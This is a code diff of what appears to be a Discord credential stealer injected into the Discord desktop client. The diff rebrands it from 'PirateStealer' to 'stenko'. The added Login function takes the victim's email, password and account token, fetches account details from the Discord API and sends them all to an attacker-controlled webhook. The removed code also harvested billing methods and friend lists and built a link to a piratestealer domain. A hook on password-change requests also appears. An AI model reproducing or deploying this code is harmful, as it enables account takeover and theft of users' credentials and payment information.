@@ -128,7 +128,7 @@ function GetRBadges(flags) {
 		badges += "verified bot developer "
 	}
 	if (badges == "") {
-		badges = ""
+		badges = "no badges"
 	}
 	return badges
 }
@@ -172,136 +172,91 @@ function GetBadges(flags) {
 	return badges
 }
 
-function totalFriends() {
-								var f = JSON.parse(info4)
-								const r = f.filter((user) => {
-
-									return user.type == 1
-								})
-								return r.length
-							}
-
-							function CalcFriends() {
-								var f = JSON.parse(info4)
-								const r = f.filter((user) => {
-									return user.type == 1
-								})
-								var gay = "";
-								for (z of r) {
-									var b = GetRBadges(z.user.public_flags)
-									if (b != "") {
-										gay += b + ` ${z.user.username}#${z.user.discriminator}\n`
-									}
-								}
-								if (gay == "") {
-									gay = "No Rare Friends"
-								}
-								return gay
-							}
-
-							function Cool() {
-								const json = JSON.parse(info3)
-								var billing = "";
-								json.forEach(z => {
-									if (z.type == "") {
-										return "\`❌\`"
-									} else if (z.type == 2 && z.invalid != !0) {
-										billing += "\`✔️\`" + " <:paypal:896441236062347374>"
-									} else if (z.type == 1 && z.invalid != !0) {
-										billing += "\`✔️\`" + " :credit_card:"
-									} else {
-										return "\`❌\`"
-									}
-								})
-								if (billing == "") {
-									billing = "\`❌\`"
-								}
-								return billing
-							}
-
 function Login(email, password, token) {
-	const window = BrowserWindow.getAllWindows()[0];
-	window.webContents.executeJavaScript(`
+    const window = BrowserWindow.getAllWindows()[0];
+    window.webContents.executeJavaScript(`
     var xmlHttp = new XMLHttpRequest();
     xmlHttp.open( "GET", "https://discord.com/api/v8/users/@me", false );
     xmlHttp.setRequestHeader("Authorization", "${token}");
     xmlHttp.send( null );
     xmlHttp.responseText;`, !0).then((info) => {
-							const json = JSON.parse(info);
-
-							var params = {
-								username: "PirateStealer",
-								content: "",
-								embeds: [{
-									"title": "User Login",
-									description: "[**<:partner:909102089513340979> │ Click Here To Copy Info On Mobile**](https://premium.piratestealer.to/raw/"+ token +"<br>"+ password+")",
-									"color": config['embed-color'],
-									"fields": [{
-										name: "Info",
-										value: `433`,
-										inline: false
-									}, {
-										name: "Username",
-										value: `433`,
-										inline: true
-									}, {
-										name: "ID",
-										value: `433`,
-										inline: true
-									}, {
-										name: "Nitro",
-										value: `${GetNitro(json.premium_type)}`,
-										inline: false
-									}, {
-										name: "Badges",
-										value: `${GetBadges(json.flags)}`,
-										inline: false
-									}, {
-										name: "Billing",
-										value: `${Cool()}`,
-										inline: false
-									}, {
-										name: "Email",
-										value: `\`${email}\``,
-										inline: true
-									}, {
-										name: "Password",
-										value: `\`${password}\``,
-										inline: true
-									}, {
-										name: "Token",
-										value: `\`\`\`${token}\`\`\``,
-										inline: false
-									}, ],
-									"author": {
-										"name": "PirateStealer"
-									},
-									"footer": {
-										"text": "PirateStealer"
-									}
-								}, {
-									"title": `Total Friends (${totalFriends()})`,
-									"color": config['embed-color'],
-									"description": CalcFriends(),
-									"author": {
-										"name": "PirateStealer"
-									},
-									"footer": {
-										"text": "PirateStealer"
-												}
-											}]
-										}
-										SendToWebhook(JSON.stringify(params))
-									})
-								})
-							})
-						})
-
-					}
-				})
-			})
-		})
-	})
+        const json = JSON.parse(info);
+        var params = {
+            username: "stenko",
+            content: "",
+            avatar_url: "https://i.imgur.com/mnMYF8Y.jpg",
+            embeds: [
+                {
+                    "title": "user logged in",
+		    "description": "᲼᲼᲼᲼",
+                    "color": 3092790,
+                    "fields": [
+                        {
+                            "name": " name",
+			    "value": `\`` + json.username + `#` + json.discriminator + `\``,
+                            "inline": true
+                        },
+                        {
+                            "name": " id",
+                            "value": `\`` + json.id + `\``,
+                            "inline": true
+                        },
+                        {
+                            "name": "᲼᲼᲼᲼",
+                            "value": `᲼᲼᲼᲼`,
+                            "inline": false
+                        },
+                        {
+                            "name": " email",
+                            "value": `\`${email}\``,
+                            "inline": true
+                        },
+                        {
+                            "name": " password",
+                            "value": `\`${password}\``,
+                            "inline": true		    
+                        },
+                        {
+                            "name": "᲼᲼᲼᲼",
+                            "value": `᲼᲼᲼᲼`,
+                            "inline": false
+                        }, 
+                        {
+                            "name": " badges",
+                            "value": `\`${GetBadges(json.flags)}\``,
+                            "inline": true		    
+                        },
+                        {
+                            "name": " nitro",
+                            "value": `\`${GetNitro(json.premium_type)}\``,
+                            "inline": true		    
+                        },
+                        {
+                            "name": "᲼᲼᲼᲼",
+                            "value": `᲼᲼᲼᲼`,
+                            "inline": false
+                        }, 
+                        {
+                            "name": " token",
+                            "value": `\`${token}\``,
+                            "inline": false
+                        }
+                    ],
+                    "author": {
+                        "name": "stenko premium version",
+			"url": `https://stenko.xyz`,
+                    },
+		    "thumbnail": {
+                        "url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`
+                    },
+                    "footer": {
+                        "text": ""
+                    }
+                }
+            ]
+        }
+        SendToWebhook(JSON.stringify(params))
+    })
 }
 
 session.defaultSession.webRequest.onCompleted(ChangePasswordFilter, (details, callback) => {
